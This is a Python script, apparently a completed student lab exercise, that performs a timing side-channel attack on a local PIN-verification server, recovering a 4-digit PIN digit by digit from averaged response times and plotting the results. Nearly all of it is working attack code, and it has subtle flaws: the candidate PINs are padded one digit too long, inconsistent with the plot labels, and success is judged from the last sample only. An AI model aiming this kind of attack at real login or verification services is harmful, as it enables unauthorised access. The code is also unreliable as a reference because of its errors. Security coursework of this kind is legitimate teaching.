import sys
import time
import requests
import matplotlib.pyplot as plt
import matplotlib.ticker as ticker
# Target configuration
URL = "http://127.0.0.1:5000/verify"
STUDENT_ID = "084"  # TODO: Put your student id (last 3 digits)
HEADERS = {"X-Student-ID": STUDENT_ID, "Content-Type": "application/json"}

# Attack configuration parameters
PIN_LENGTH = 4
SAMPLES_PER_GUESS = 5  # Number of samples per digit to average out noise
DIGITS = "0123456789"
STATS = {}

def measure_response_time(candidate_pin: str) -> float:
  """Sends a request to the target server and returns the elapsed time in milliseconds."""
  start_time = time.perf_counter()
  try:
    response = requests.post(
        URL, json={"pin": candidate_pin}, headers=HEADERS, timeout=5
    )
    elapsed_ms = (time.perf_counter() - start_time) * 1000
    return elapsed_ms, response.status_code
  except requests.RequestException as e:
    print(f"\n[!] Error connecting to target server: {e}")
    sys.exit(1)


def get_average_timing(candidate_pin: str, samples: int) -> tuple[float, bool]:
  """Averages response times across multiple samples to smooth out system noise."""
  
  # TODO: Request sample number of times and return average elapsed time and whether the request was a success
  t = 0
  sc = 0
  for _ in range(samples):
    y,sc = measure_response_time(candidate_pin)
    t += y
  avg_time = t/samples
  success = False
  if sc == 200:
    success = True
  return avg_time, success


def recover_secret_pin():
  print("=" * 60)
  print(f" Starting Timing Attack Exploit against {URL}")
  print(f" Target Student ID : {STUDENT_ID}")
  print(f" Samples per guess : {SAMPLES_PER_GUESS}")
  print("=" * 60 + "\n")
  
  known_prefix = ""
  # TODO: Use the methods to build up the secret pin
  for i in range(PIN_LENGTH):
    correct = ""
    mx = -1
    mp1 = {}
    for c in DIGITS:
      payload = known_prefix + c + "0"*(PIN_LENGTH-i)
      elapsed_time,su = get_average_timing(payload,SAMPLES_PER_GUESS)
      mp1[c] = elapsed_time
      if mx <= elapsed_time:
         mx = elapsed_time
         correct = c
    STATS[i] = mp1
    plot(i,known_prefix,mp1)
    known_prefix += correct          

  # Final verification check
  print("[*] Verifying recovered PIN with server...")
  avg_time, is_success = get_average_timing(known_prefix, samples=1)
  if is_success:
    print("\n" + "=" * 60)
    print(f"[+] VERIFIED! Recovered PIN: {known_prefix}")
    print("=" * 60)
    print(f"Time Stats of each digit in each position")
    print("="*60)
    show_stats()
  else:
    print("\n[-] Failed to verify recovered PIN. Consider increasing SAMPLES_PER_GUESS.")

def plot(pos:int,known_prefix:str,t_dict:dict):
    fig,ax = plt.subplots(figsize=(8, 5))
    suff = "0"*(PIN_LENGTH-pos-1)
    labels = [f"{known_prefix}{digit}{suff}" for digit in t_dict.keys()]
    vals = list(t_dict.values())
    bars = ax.barh(labels, vals, color='#589cfc', height=0.6, edgecolor='none')
    ax.invert_yaxis()
    ax.xaxis.set_major_formatter(ticker.FuncFormatter(lambda x, pos: f"{int(x)}ms"))
    ax.grid(axis='x', linestyle='--', alpha=0.5)
    ax.set_axisbelow(True)
    for spine in ['top', 'right', 'left']:
        ax.spines[spine].set_visible(False)
    ax.spines['bottom'].set_color('#cccccc')
    ax.tick_params(axis='both', which='both', length=0)
    ax.tick_params(axis='y', colors='#555555', labelsize=10)
    ax.tick_params(axis='x', colors='#555555', labelsize=10)
    plt.title(f"Time taken on Position {pos + 1}", loc='left', pad=15, fontsize=12, fontweight='bold', color='#333333')
    plt.tight_layout()
    plt.show()

def show_stats():
  for pos, t_dict in STATS.items():
    print(f"Time taken on Position {pos}")
    for d,t in t_dict.items():
      print(f"{d}: {t:.4f}")

if __name__ == "__main__":
  recover_secret_pin()